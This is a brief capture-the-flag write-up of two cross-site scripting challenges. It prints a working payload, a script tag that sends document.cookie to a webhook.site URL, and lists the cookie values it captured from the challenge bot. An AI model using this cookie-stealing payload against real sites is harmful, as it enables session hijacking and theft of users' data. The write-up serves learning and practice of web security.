## Approach:
- In this challenge, first I read about what is an XSS injection, I got a little idea that it's about injecting our malicious code into a website link so that an attacker can steal the sensitive information from the user when he/she clicks on the link.
- But not getting how to proceed with the challenge.
- I used  [Web](https://Webhook.site)   and got a query to steal cookies from the bot.

  ```
  <script>window.location='https://webhook.site/176d0f23-575b-4184-8e83-1aefa5c60ca1?c='+document.cookie</script>
  ```

- Pasted this query in the ``` XSS ME 1 ``` and sent it to the payload.
- Got a cookie as ``` c = xss2=/bf2a73106a3aa48bab9b8b47e4bd350e ```

- Pasted the the end part of this response to the URL of the challenge site.
- In ``` XSS ME 2 ```, repeated the same procedure with the below payload

  <script>window.location='	https://webhook.site/176d0f23-575b-4184-8e83-1aefa5c60ca1?c='+document.cookie</script>
  ```

- Got another cookie as ``` c = xss3=/3e79c8a64bd10f5fa897b7832384f043 ``` in [Web](https://Webhook.site)

  ```
